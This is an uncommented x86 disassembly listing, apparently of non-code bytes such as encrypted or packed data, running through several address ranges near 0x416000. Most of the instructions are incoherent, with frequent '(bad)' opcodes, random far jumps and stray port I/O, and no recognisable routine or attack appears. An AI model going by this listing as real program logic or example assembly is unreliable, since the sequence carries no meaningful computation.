  415e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5b:	int    0x5e
  415e5d:	pop    es
  415e5e:	cmp    BYTE PTR [ebp-0x4e],dl
  415e61:	mov    bl,0x8b
  415e63:	mov    ch,0x5d
  415e65:	mov    DWORD PTR [eax+ecx*2],esi
  415e68:	xchg   esp,eax
  415e69:	rcr    bl,0x4b
  415e6c:	or     dh,ah
	...
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x4d]
  415ee3:	xor    eax,DWORD PTR [edi]
  415ee5:	in     al,dx
  415ee6:	addr16 in al,dx
  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	mov    cl,0x88
  415ef0:	lods   al,BYTE PTR ds:[esi]
  415ef1:	inc    edx
  415ef2:	adc    esp,DWORD PTR [ecx]
  415ef4:	mov    bl,0x81
  415ef6:	mov    ecx,0x7a7af9d6
  415efb:	test   DWORD PTR [ebx+0xf],edx
  415efe:	shl    edx,0xda
  415f01:	pop    eax
  415f02:	imul   esi,DWORD PTR [eax],0xa097a32
  415f08:	mov    bl,0xfc
  415f0a:	sbb    DWORD PTR [eax],ebx
  415f0c:	(bad)  
  415f0d:	pop    esi
  415f0e:	sar    DWORD PTR [ecx+0xe629e2d],1
  415f14:	test   bl,al
  415f16:	add    DWORD PTR [ebx],edi
  415f18:	in     al,dx
  415f19:	adc    al,bh
  415f1b:	(bad)  
  415f1c:	add    DWORD PTR [ebp+0x2],0xffffff9c
  415f20:	pop    edx
  415f21:	fmul   QWORD PTR [edx+0x4302d325]
  415f27:	leave  
  415f28:	or     al,0xa2
  415f2a:	dec    ebx
  415f2b:	push   0x4f
  415f2d:	repz sub eax,0xee7fad19
  415f33:	jle    0x415eef
  415f35:	pop    es
  415f36:	cs in  al,0xa8
  415f39:	jmp    0xefdc:0x4ddda8af
  415f40:	test   eax,0x380ced9e
  415f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f47:	sbb    bh,BYTE PTR [eax]
  415f49:	xor    DWORD PTR [ebx],edi
  415f4b:	int    0x3a
  415f4d:	leave  
  415f4e:	sub    DWORD PTR [esi+0x1805140d],edx
  415f54:	add    al,0xa7
  415f56:	rol    DWORD PTR [ebx-0x10],cl
  415f59:	and    BYTE PTR [esi],0x18
  415f5c:	in     al,dx
  415f5d:	(bad)  
  415f5e:	xor    bh,BYTE PTR [eax+0x665659f1]
  415f64:	jmp    0x415f0d
  415f66:	mov    ebx,DWORD PTR [eax-0x5]
  415f69:	inc    esi
  415f6a:	adc    edi,DWORD PTR [ebx+edi*2-0x18178e18]
  415f71:	imul   ebx,DWORD PTR [eax],0x23
  415f74:	xchg   ebx,eax
  415f75:	iret   
  415f76:	xor    DWORD PTR [eax-0x58a76ec5],edx
  415f7c:	dec    esi
  415f7d:	popf   
  415f7e:	mov    bh,0xb8
  415f80:	xchg   ecx,eax
  415f81:	xor    al,0x87
  415f83:	gs int 0x4b
  415f86:	mov    ds:0x117aa8ca,eax
  415f8b:	push   cs
  415f8c:	inc    ebx
  415f8d:	jp     0x41600e
  415f8f:	test   edi,esp
  415f91:	or     edi,ecx
  415f93:	pop    ecx
  415f94:	mov    edi,0x78758b66
  415f99:	jl     0x415f55
  415f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f9c:	or     ebx,DWORD PTR [ebp+eiz*4+0x1c]
  415fa0:	js     0x415f50
  415fa2:	mov    esp,DWORD PTR [eax-0x51]
  415fa5:	je     0x415fbb
  415fa7:	mov    ebx,DWORD PTR [edi+0x25818d6c]
  415fad:	lea    ecx,[ebp+0x28]
  415fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb1:	hlt    
  415fb2:	cmp    al,0xaf
  415fb4:	mov    bh,0x95
  415fb6:	popa   
  415fb7:	retf   0x6f25
  415fba:	add    DWORD PTR [ebp-0x3b],edi
  415fbd:	push   ebx
  415fbe:	aam    0x29
  415fc0:	fdivr  DWORD PTR [ebx+0x75cd1fdb]
  415fc6:	dec    eax
  415fc7:	pop    ebp
  415fc8:	loope  0x415fe2
  415fca:	hlt    
  415fcb:	fadd   DWORD PTR [edi]
  415fcd:	dec    ecx
  415fce:	daa    
  415fcf:	sbb    BYTE PTR [ebp-0x12],dh
  415fd2:	call   0x60f05d8e
  415fd7:	inc    edx
  415fd8:	call   0x96a56262
  415fdd:	test   DWORD PTR [ecx-0x60],esp
  415fe0:	jo     0x415ffe
  415fe2:	or     eax,esi
  415fe4:	inc    eax
  415fe5:	add    bl,BYTE PTR [edi+0x43]
  415fe8:	sub    DWORD PTR [ebp+eiz*1+0x5c],esp
  415fec:	cmp    al,0x89
	...
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	(bad)  
  416063:	in     eax,dx
  416064:	aas    
  416065:	add    eax,0xed67
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	sbb    al,0xcd
  416070:	push   edi
  416071:	pop    esi
  416072:	xor    DWORD PTR [ebx],edi
  416074:	inc    ebx
  416075:	(bad)  
  416076:	(bad)  
  416078:	xor    al,0x8
  41607a:	add    eax,eax
  41607c:	add    al,0x50
  41607e:	call   0xd87f:0x9c89f8e2
  416085:	or     edi,DWORD PTR [ebx+0x7]
  416088:	mov    ebp,0x80f95959
  41608d:	mov    bh,0x2d
  41608f:	sbb    BYTE PTR [ebx+0x4c86c7ba],bh
  416095:	mov    eax,ds:0x49958a71
  41609a:	not    DWORD PTR ds:0x3c5a47af
  4160a0:	inc    esp
  4160a1:	mov    esp,esp
  4160a3:	imul   eax,DWORD PTR [edi+0x62b8a3d4],0xe29156d0
  4160ad:	push   ecx
  4160ae:	push   0x45
  4160b0:	pop    edx
  4160b1:	leave  
  4160b2:	stc    
  4160b3:	and    DWORD PTR [eax-0x722a06bf],0xffffffe0
  4160ba:	dec    ebp
  4160bb:	sbb    al,0xb3
  4160bd:	xchg   esi,eax
  4160be:	and    cl,ch
  4160c0:	inc    ebp
  4160c1:	dec    esp
  4160c2:	mov    esp,0xe822ac0
  4160c7:	sub    eax,0x6e0e0f7c
  4160cc:	sub    BYTE PTR [ecx+0x5b747f81],0x60
  4160d3:	mov    dh,BYTE PTR [ecx]
  4160d5:	pop    ecx
  4160d6:	cmp    cl,al
  4160d8:	sub    eax,0xa9b1cc0d
  4160dd:	jb     0x416081
  4160df:	pusha  
  4160e0:	cld    
  4160e1:	mov    ah,0x9f
  4160e3:	sub    dl,BYTE PTR [ecx]
  4160e5:	mov    edx,0x9a82656
  4160ea:	jb     0x416157
  4160ec:	adc    DWORD PTR [ebx],ebp
  4160ee:	fisubr DWORD PTR [edi]
  4160f0:	cmp    esp,DWORD PTR [eax]
  4160f2:	data16 ds out dx,al
  4160f5:	out    dx,al
  4160f6:	adc    BYTE PTR [ebx+ebx*4+0xa1d7457],al
  4160fd:	into   
  4160fe:	in     al,0x69
  416100:	jp     0x416111
  416102:	lahf   
  416103:	repnz fistp DWORD PTR [esi-0x366b9b47]
  41610a:	add    esi,esi
  41610c:	xor    eax,0x7a027cef
  416111:	mul    ebp
  416113:	xchg   ecx,eax
  416114:	mov    ss,WORD PTR [edi-0x77]
  416117:	jns    0x4160ce
  416119:	cmp    edx,ecx
  41611b:	sub    eax,0xd5dc86e2
  416120:	sbb    DWORD PTR fs:[ecx+0x58],eax
  416124:	ror    BYTE PTR [ecx],cl
  416126:	in     al,0xf2
  416128:	loope  0x416185
  41612a:	cli    
  41612b:	xor    eax,0x4f3b5f81
  416130:	or     edx,edx
  416132:	inc    edi
  416133:	icebp  
  416134:	adc    al,0xee
  416136:	test   DWORD PTR [ebp-0x57a88f0f],edi
  41613c:	out    dx,eax
  41613d:	cwde   
  41613e:	xor    edi,edi
  416140:	rol    BYTE PTR [edi],1
  416142:	aam    0xf9
  416144:	push   ebx
  416145:	or     esp,edx
  416147:	lods   al,BYTE PTR ds:[esi]
  416148:	(bad)  
  416149:	jmp    0xd5665625
  41614e:	into   
  41614f:	mov    ch,BYTE PTR [edi]
  416151:	repz adc BYTE PTR [edi-0x7c092ba],bh
  416158:	hlt    
  416159:	mov    ebx,0xd6c09e7a
  41615e:	mov    ebx,0x8eb2cb85
  416163:	push   ds
  416164:	call   0xbabacdf5
  416169:	cmp    BYTE PTR [ebp-0x48],ah
  41616c:	pop    es
  41616d:	dec    edx
	...
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0x1d4273f3
  4161e5:	jg     0x41624e
  4161e7:	out    dx,al
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	or     eax,0xd1f9cc14
  4161f3:	out    dx,al
  4161f4:	lods   eax,DWORD PTR ds:[esi]
  4161f5:	shl    BYTE PTR [ebx+0x21],0xea
  4161f9:	in     eax,dx
  4161fa:	adc    al,0x90
  4161fc:	int3   
  4161fd:	jbe    0x4161b2
  4161ff:	pop    esp
  416200:	int    0xb2
  416202:	xchg   ebx,eax
  416203:	dec    eax
  416204:	fadd   st,st(3)
  416206:	and    dl,al
  416208:	xchg   ecx,eax
  416209:	jp     0x416203
  41620b:	inc    ebp
  41620c:	out    dx,eax
  41620d:	mov    edx,0xce7a8cc2
  416212:	push   ds
  416213:	retf   0x2fd6
  416216:	inc    ebp
  416217:	pop    eax
  416218:	test   DWORD PTR [esi+edx*1],0x90c07874
  41621f:	sub    eax,0xeeaa748f
  416224:	and    eax,0x2e32669f
  416229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41622a:	jg     0x4161d5
  41622c:	imul   ecx,DWORD PTR [edi-0x59a3d240],0x82e7904a
  416236:	add    DWORD PTR [esi-0x336dbb7f],eax
  41623c:	and    ebx,ebp
  41623e:	fcomp  DWORD PTR [eax+0x0]
  416241:	mov    edi,0xf3de2a91
  416246:	sbb    BYTE PTR [ebp-0x3c51a708],ch
  41624c:	sub    al,0xf3
  41624e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41624f:	ja     0x416223
  416251:	and    dl,BYTE PTR [ebp-0x63abbe58]
  416257:	cvtps2pi mm5,QWORD PTR [ecx]
  41625a:	xchg   DWORD PTR ds:0xb0adb519,ecx
  416260:	sti    
  416261:	xchg   ecx,eax
  416262:	addr16 jl 0x4162c8
  416265:	add    al,0x9c
  416267:	inc    esp
  416268:	adc    al,0x22
  41626a:	pusha  
  41626b:	and    eax,0x33950698
  416270:	(bad)  
  416271:	sti    
  416272:	lods   eax,DWORD PTR ds:[esi]
  416273:	mov    bl,0xbb
  416275:	mov    esi,0x8347a7c2
  41627a:	add    eax,0x3d5bc86c
  41627f:	xor    BYTE PTR [ebx-0x180136b6],dh
  416285:	jge    0x416234
  416287:	sbb    ecx,DWORD PTR [edi]
  416289:	xor    al,0xfb
  41628b:	or     al,0xf2
  41628d:	mov    DWORD PTR [ebx-0x53],edi
  416290:	pop    es
  416291:	(bad)  
  416292:	(bad)  
  416293:	xchg   ebp,eax
  416294:	int    0xe8
  416296:	fwait
  416297:	imul   ecx,eax,0xfffffff7
  41629a:	or     DWORD PTR [edi],ecx
  41629c:	add    ah,BYTE PTR [edx]
  41629e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41629f:	ret    0x35e2
  4162a2:	push   ecx
  4162a3:	je     0x416236
  4162a5:	pop    ecx
  4162a6:	xor    DWORD PTR [ebp+edi*4-0x1c53c79c],ebp
  4162ad:	(bad)
  4162b0:	pop    ecx
  4162b1:	xchg   ebp,eax
  4162b2:	ja     0x4162cf
  4162b4:	and    DWORD PTR [eax-0x4],edi
  4162b7:	mov    ebx,0x77212241
  4162bc:	mov    bh,0x66
  4162be:	(bad)  
  4162bf:	rol    BYTE PTR [ebp+0x76],cl
  4162c2:	inc    ebp
  4162c3:	ret    
  4162c4:	rol    BYTE PTR ds:0xe914e0c2,1
  4162ca:	xchg   ecx,eax
  4162cb:	lds    esp,FWORD PTR [edx+ecx*2]
  4162ce:	mov    al,0x94
  4162d0:	ss dec ecx
  4162d2:	aam    0x27
  4162d4:	jo     0x41630b
  4162d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162d7:	mov    DWORD PTR [ebx],eax
  4162d9:	jbe    0x41625f
  4162db:	adc    edi,eax
  4162dd:	ret    0x18a3
  4162e0:	adc    ebp,ebp
  4162e2:	inc    ecx
  4162e3:	cmp    al,0x3d
  4162e5:	xor    al,0x59
  4162e7:	mov    ch,0xb5
  4162e9:	add    DWORD PTR [eax-0x2e],esp
  4162ec:	push   ecx
  4162ed:	std    
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x6760:0xf2f869ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	jns    0x416372
  416370:	inc    ebx
  416371:	pop    ebx
  416372:	dec    ebp
  416373:	or     BYTE PTR [edi+0x5b],dh
  416376:	mov    dh,0x85
  416378:	mov    dl,0x53
  41637a:	in     eax,dx
  41637b:	push   ds
  41637c:	dec    edx
  41637d:	imul   ecx,DWORD PTR [edx],0x49
  416380:	mov    cl,0xd3
  416382:	jb     0x4163fa
  416384:	or     esi,ebp
  416386:	mov    bl,0xe1
  416388:	mov    bl,BYTE PTR [ecx]
  41638a:	mov    dl,0xa7
  41638c:	(bad)  
  41638d:	cli    
  41638e:	aam    0xf1
  416390:	les    esi,FWORD PTR [ebx+0x63]
  416393:	fmulp  st(3),st
  416395:	mov    esi,0x9a1d02c2
  41639a:	sub    dl,ah
  41639c:	addr16 test esi,edi
  41639f:	add    al,0xfb
  4163a1:	inc    edx
  4163a2:	scas   al,BYTE PTR es:[edi]
  4163a3:	and    eax,0xace5b35f
  4163a8:	inc    ebx
  4163a9:	pop    ebx
  4163aa:	ja     0x41637c
  4163ac:	loopne 0x4163c0
  4163ae:	mov    dh,0xc2
  4163b0:	mov    al,ds:0x374c6c1b
  4163b5:	pop    eax
  4163b6:	pop    edx
  4163b7:	push   ebx
  4163b8:	pop    ecx
  4163b9:	add    eax,0x3d768ead
  4163be:	ficom  DWORD PTR [eax+0x4c69807f]
  4163c4:	icebp  
  4163c5:	loopne 0x416411
  4163c7:	jl     0x4163ca
  4163c9:	test   eax,0xb12123bc
  4163ce:	cld    
  4163cf:	adc    DWORD PTR [ecx+eiz*2+0x7c3fc73b],0xffffff93
  4163d7:	in     al,0x7f
  4163d9:	arpl   bx,bp
  4163db:	inc    ebx
  4163dc:	jmp    0x8c866c24
  4163e1:	jl     0x416459
  4163e3:	ins    BYTE PTR es:[edi],dx
  4163e4:	das    
  4163e5:	jmp    0x4163d5
  4163e7:	push   ds
  4163e8:	xor    dh,bh
  4163ea:	dec    esi
  4163eb:	loop   0x416392
  4163ed:	pop    esp
  4163ee:	mov    dl,0xec
  4163f0:	or     al,0x10
  4163f2:	pop    ebx
  4163f3:	je     0x4163e4
  4163f5:	stc    
  4163f6:	xchg   DWORD PTR [ebp-0x4b],esi
  4163f9:	sbb    al,0xf0
  4163fb:	(bad)  
  4163fc:	jmp    0x47b1f969
  416401:	xor    al,0x62
  416403:	inc    DWORD PTR [ebx-0x7cabeb5c]
  416409:	xchg   DWORD PTR [esi],esi
  41640b:	jne    0x416422
  41640d:	mov    dh,0x8f
  41640f:	shl    DWORD PTR [ecx-0x1c],0xb
  416413:	inc    esi
  416414:	lock mov al,cs:0x8da6b2de
  41641b:	mov    ah,0xe
  41641d:	ret    0x9568
  416420:	mov    eax,fs:0x95c3f615
  416426:	cld    
  416427:	push   ss
  416428:	out    0xcc,al
  41642a:	pop    edi
  41642b:	les    ebp,FWORD PTR [edx+0x7a15420f]
  416431:	fild   WORD PTR [edi+0x0]
  416434:	push   ecx
  416435:	repnz adc al,0x73
  416438:	jnp    0x41648a
  41643a:	std    
  41643b:	adc    ch,BYTE PTR [edi+0x47]
  41643e:	add    edx,DWORD PTR [edx-0x112db182]
  416444:	and    al,0xde
  416446:	xchg   edi,eax
  416447:	sar    BYTE PTR [ebp-0x27b6023d],cl
  41644d:	mov    ebx,0x2bd2624d
  416452:	sub    al,0x5d
  416454:	lahf   
  416455:	shl    BYTE PTR [edi+0x11c34068],0x41
  41645c:	retf   
  41645d:	ja     0x4163fa
  41645f:	test   al,0xcb
  416461:	rcl    DWORD PTR [ebp+0x731d9718],0x4e
  416468:	and    BYTE PTR [esi],bh
  41646a:	mov    esp,0x3d098f
	...
  4164d3:	add    BYTE PTR [eax],al
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	sbb    edi,ebx
  4164e4:	ins    BYTE PTR es:[edi],dx
  4164e5:	xchg   ecx,eax
  4164e6:	lock add BYTE PTR [bx+si],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	cmp    eax,0x9c24d6f8
  4164f3:	sub    eax,0xc2d3e4a8
  4164f8:	test   BYTE PTR [esi+0x7580fc64],dh
  4164fe:	das    
  4164ff:	pop    es
  416500:	or     edi,DWORD PTR ds:0xabfa82ba
  416506:	jmp    eax
  416508:	rcl    DWORD PTR [ebx+ecx*8],0x69
  41650c:	out    dx,eax
  41650d:	das    
  41650e:	mov    ah,0x8b
  416510:	fidivr WORD PTR [edi]
  416512:	sub    al,0xb7
  416514:	jge    0x416567
  416516:	fs mov esi,0x2bc11f3b
  41651c:	test   BYTE PTR [ebp-0x79],0x96
  416520:	js     0x4164b4
  416522:	dec    ecx
  416523:	lea    ebx,[ebp+0x4524bdf0]
  416529:	or     ebp,DWORD PTR [eax+eiz*2-0xb]
  41652d:	add    eax,0x4bc2909a
  416532:	fistp  QWORD PTR [esi+0x4383395e]
  416538:	je     0x4165a2
  41653a:	xchg   esi,eax
  41653b:	mov    dh,0x42
  41653d:	ja     0x41656a
  41653f:	push   cs
  416540:	fidiv  WORD PTR [edi+0xc]
  416543:	sub    eax,0xcfc74fbc
  416548:	inc    ebx
  416549:	lahf   
  41654a:	xchg   ebp,eax
  41654b:	scas   eax,DWORD PTR es:[edi]
  41654c:	push   edx
  41654d:	adc    DWORD PTR [ebx+0x24],ebx
  416550:	mov    ds:0xa8e89d9c,al
  416555:	adc    ebx,DWORD PTR [eax+0x2ed747b5]
  41655b:	xor    dl,al
  41655d:	pop    eax
  41655e:	sub    al,0xbc
  416560:	outs   dx,DWORD PTR ds:[esi]
  416561:	inc    ebx
  416562:	pop    ebp
  416563:	add    al,BYTE PTR [eax+0x18ba268f]
  416569:	fiadd  WORD PTR [edx+0x1]
  41656c:	push   esp
  41656d:	mov    BYTE PTR [ebx+0x33d4d13c],ch
  416573:	inc    ebx
  416574:	imul   ebx,esi,0x8cbbe748
  41657a:	mov    fs,WORD PTR [eax+0x34]
  41657d:	test   dl,dl
  41657f:	repz test cl,dl
  416582:	mov    eax,0xd7917160
  416588:	scas   al,BYTE PTR es:[edi]
  416589:	lods   al,BYTE PTR ds:[esi]
  41658a:	mov    ds:0x91cb01b9,eax
  41658f:	and    ecx,ecx
  416591:	mov    edi,0x75412c42
  416596:	sub    ebx,DWORD PTR [ebx-0x1b895545]
  41659c:	xchg   ebp,eax
  41659d:	sbb    al,BYTE PTR [eax-0x4e]
  4165a0:	(bad)  
  4165a1:	fwait
  4165a2:	clc    
  4165a3:	dec    ecx
  4165a4:	and    ch,al
  4165a6:	mov    esi,0xdeab3ca5
  4165ab:	pop    esi
  4165ac:	fmul   QWORD PTR [ebx+0x7d9ebc65]
  4165b2:	inc    esi
  4165b3:	int3   
  4165b4:	ficom  DWORD PTR [ecx]
  4165b6:	push   ecx
  4165b7:	fs int3 
  4165b9:	cld    
  4165ba:	xchg   esp,eax
  4165bb:	out    dx,al
  4165bc:	shl    BYTE PTR [esi+esi*8],cl
  4165bf:	and    DWORD PTR [esi],eax
  4165c1:	adc    bh,BYTE PTR [ebx]
  4165c3:	js     0x416631
  4165c5:	push   ecx
  4165c6:	out    0x36,eax
  4165c8:	inc    edx
  4165c9:	or     eax,0x2aa0c10a
  4165ce:	bound  ebp,QWORD PTR [edx]
  4165d0:	in     eax,0xd4
  4165d2:	repz pop ebx
  4165d4:	int3   
  4165d5:	or     al,0xf5
  4165d7:	mov    edx,0xb6b0a183
  4165dc:	fwait
  4165dd:	addr16 add bl,bl
  4165e0:	icebp  
  4165e1:	repz cs out dx,al
  4165e4:	push   0x22
  4165e6:	jmp    0x391:0x3300eb7b
  4165ed:	popf   
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x7ab04354]
  416663:	cmp    eax,esp
  416665:	mov    ah,0x67
  416667:	icebp  
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	rcl    BYTE PTR [ebp-0x49],0x5f
  416672:	bound  ebp,QWORD PTR ds:0x4bc49c4e
  416678:	mov    al,ds:0xee453875
  41667d:	and    esi,DWORD PTR [edi]
  41667f:	push   edi
  416680:	fwait
  416681:	icebp  
  416682:	popa   
  416683:	cli    
  416684:	mov    edi,0x9766e41d
  416689:	les    edx,FWORD PTR [ecx]
  41668b:	les    ebx,FWORD PTR [esi+0x2f]
  41668e:	cld    
  41668f:	xor    eax,0x8969bfbc
  416694:	add    DWORD PTR [ebx+ecx*4+0x35910fe6],edx
  41669b:	cmp    DWORD PTR [ebx+0x44],esp
  41669e:	push   edx
  41669f:	xchg   ah,cl
  4166a1:	out    dx,eax
  4166a2:	ret    
  4166a3:	dec    eax
  4166a4:	aam    0x51
  4166a6:	enter  0x9bf6,0x0
  4166aa:	loope  0x41672b
  4166ac:	mov    edx,0x3ee789e2
  4166b1:	cwde   
  4166b2:	dec    edi
  4166b3:	push   edx
  4166b4:	sub    dh,BYTE PTR [ecx-0x16f8ef3]
  4166ba:	je     0x416724
  4166bc:	lds    esp,FWORD PTR [esi]
  4166be:	sbb    BYTE PTR [ebp+ecx*2-0x1fc3a244],al
  4166c5:	or     al,0x98
  4166c7:	push   esi
  4166c8:	aas    
  4166c9:	stos   BYTE PTR es:[edi],al
  4166ca:	and    ebp,ecx
  4166cc:	ret    0xb57d
  4166cf:	jge    0x416655
  4166d1:	sbb    bl,BYTE PTR [eax+0x2a]
  4166d4:	pop    ds
  4166d5:	inc    esi
  4166d6:	daa    
  4166d7:	mov    ebp,0xdbdfce41
  4166dc:	ret    0xc521
  4166df:	xor    edi,DWORD PTR [edi-0x551024ba]
  4166e5:	ds xchg ch,dh
  4166e8:	imul   edi,edi,0x60
  4166eb:	sar    DWORD PTR ss:[edi+0x61],cl
  4166ef:	cwde   
  4166f0:	fcomp  DWORD PTR [esi+0x39ac5c41]
  4166f6:	pop    es
  4166f7:	(bad)  
  4166f8:	cmp    DWORD PTR [esi],edi
  4166fa:	adc    bl,dh
  4166fc:	stc    
  4166fd:	enter  0x582d,0xc5
  416701:	vpunpckhdq ymm1,ymm6,YMMWORD PTR [eax-0x77]
  416706:	mov    ebp,0x11ce3a59
  41670b:	mov    esp,0xaae37f22
  416710:	add    BYTE PTR [edx],al
  416712:	data16 ins BYTE PTR es:[edi],dx
  416714:	call   0x7b658318
  416719:	add    ch,BYTE PTR [ebx]
  41671b:	inc    esp
  41671c:	pop    ds
  41671d:	sub    bh,cl
  41671f:	push   es
  416720:	imul   edx,edi,0xffffff94
  416723:	inc    esi
  416724:	jmp    0x9d04:0xe0f4115d
  41672b:	and    esi,DWORD PTR [esi+esi*4-0x119c149d]
  416732:	push   ecx
  416733:	lods   eax,DWORD PTR ds:[esi]
  416734:	pop    eax
  416735:	pop    esi
  416736:	push   0x34391bb0
  41673b:	jle    0x4166db
  41673d:	mov    bh,0xe9
  41673f:	outs   dx,BYTE PTR ds:[esi]
  416740:	stos   BYTE PTR es:[edi],al
  416741:	pop    ecx
  416742:	mov    esp,edx
  416744:	push   0x13
  416746:	(bad)  
  416747:	dec    ebp
  416748:	xchg   edi,eax
  416749:	mov    ecx,0x1fc1780f
  41674e:	add    esp,DWORD PTR [edi]
  416750:	outs   dx,DWORD PTR ds:[esi]
  416751:	jmp    0xc333e5b2
  416756:	pop    edx
  416757:	jmp    0xb6e0:0xad7a5f7a
  41675e:	aaa    
  41675f:	daa    
  416760:	inc    esp
  416761:	pop    DWORD PTR [ecx-0x57907120]
  416767:	jo     0x4166fe
  416769:	and    DWORD PTR [eax-0x58],0x3d02
	...
  4167d4:	add    BYTE PTR [eax],al
  4167d6:	(bad)  
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	int3   
  4167e3:	and    al,0x60
  4167e5:	sbb    DWORD PTR [edi-0xe],esp
  4167e8:	add    BYTE PTR [eax],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	dec    edi
  4167ef:	repz test al,0x6a
  4167f2:	sub    ebp,edx
  4167f4:	retf   0x8bed
  4167f7:	mov    edi,DWORD PTR [esi-0x1344327e]
  4167fd:	hlt    
  4167fe:	xchg   edi,eax
  4167ff:	adc    BYTE PTR [edx],cl
  416801:	shl    DWORD PTR [ebp+0x65d57cd8],0x8
  416808:	mov    eax,0xacacdaa7
  41680d:	adc    BYTE PTR ds:0x337b0c4f,bh
  416813:	and    BYTE PTR [eax],al
  416815:	out    dx,al
  416816:	adc    bl,dh
  416818:	mov    al,BYTE PTR [ebp+0x534c5d79]
  41681e:	sbb    BYTE PTR [edx+0x6e02b979],0x12
  416825:	(bad)  
  416826:	or     edi,DWORD PTR [eax]
  416828:	iret   
  416829:	or     al,0xa0
  41682b:	inc    ebp
  41682c:	ss push ebx
  41682e:	dec    ebx
  41682f:	ins    BYTE PTR es:[edi],dx
  416830:	inc    edx
  416831:	fs sar esi,1
  416834:	mov    DWORD PTR [eax+0x3d],edx
  416837:	push   edx
  416838:	xlat   BYTE PTR ds:[ebx]
  416839:	push   esp
  41683a:	inc    edx
  41683b:	xlat   BYTE PTR ds:[ebx]
  41683c:	sub    al,0x4f
  41683e:	or     dl,BYTE PTR ss:[esi]
  416841:	call   0xaff1d08c
  416846:	jp     0x41682e
  416848:	sub    ch,dl
  41684a:	test   DWORD PTR [eax+0x34676cc4],esp
  416850:	les    ebp,FWORD PTR [ebp+0x1d]
  416853:	dec    esi
  416854:	sub    ch,BYTE PTR [esi]
  416856:	out    0x88,al
  416858:	mov    dl,0x25
  41685a:	add    BYTE PTR ds:0x402a63e7,dh
  416860:	out    0x5b,eax
  416862:	call   0xb14c27e8
  416867:	xchg   edx,eax
  416868:	xor    DWORD PTR [esi+edi*2],ebp
  41686b:	fldenv [edi-0x542712c9]
  416871:	push   esp
  416873:	retf   0xe486
  416876:	or     DWORD PTR [esi-0x27],0xffffffce
  41687a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41687c:	iret   
  41687d:	adc    ch,BYTE PTR [ebx+ebp*1+0x8e37131]
  416884:	mov    bl,0x71
  416886:	mov    ds:0x2cc405ef,eax
  41688b:	dec    edx
  41688c:	add    ecx,DWORD PTR [ecx]
  41688e:	jne    0x416891
  416890:	xchg   esi,eax
  416891:	nop
  416892:	or     DWORD PTR ds:0xc9f9662b,ebx
  416898:	mov    BYTE PTR [edx-0x3c],dl
  41689b:	fcom   QWORD PTR [ecx+0xf3c7cb8]
  4168a1:	in     eax,0xde
  4168a3:	pop    ds
  4168a4:	cmp    DWORD PTR [ecx+0x5f739eac],ecx
  4168aa:	jne    0x4168e1
  4168ac:	mov    dl,0x4
  4168ae:	inc    edx
  4168af:	add    al,0x54
  4168b1:	popa   
  4168b2:	enter  0x2066,0xc6
  4168b6:	mov    ds:0xebd80716,al
  4168bb:	cmp    al,0x9
  4168bd:	and    eax,DWORD PTR [edx]
  4168bf:	adc    al,0x63
  4168c1:	pop    edi
  4168c2:	xchg   DWORD PTR [edi],ebx
  4168c4:	adc    al,0xa2
  4168c6:	aam    0x94
  4168c8:	test   eax,0xef44254f
  4168cd:	aad    0x6c
  4168cf:	ins    DWORD PTR es:[edi],dx
  4168d0:	aam    0x47
  4168d2:	cmc    
  4168d3:	or     al,0xcb
  4168d5:	fdiv   QWORD PTR [ebp+0x4e252a72]
  4168db:	out    dx,eax
  4168dc:	mov    WORD PTR [esi+ebx*8],fs
  4168df:	enter  0x9604,0x21
  4168e3:	pop    ebp
  4168e4:	push   0x57da2bbc
  4168e9:	add    ebp,DWORD PTR [edx+0xf]
  4168ec:	inc    esi
  4168ed:	popa   
	...
  416956:	shr    DWORD PTR [edi-0x4810cfa],1
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x4957e654
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
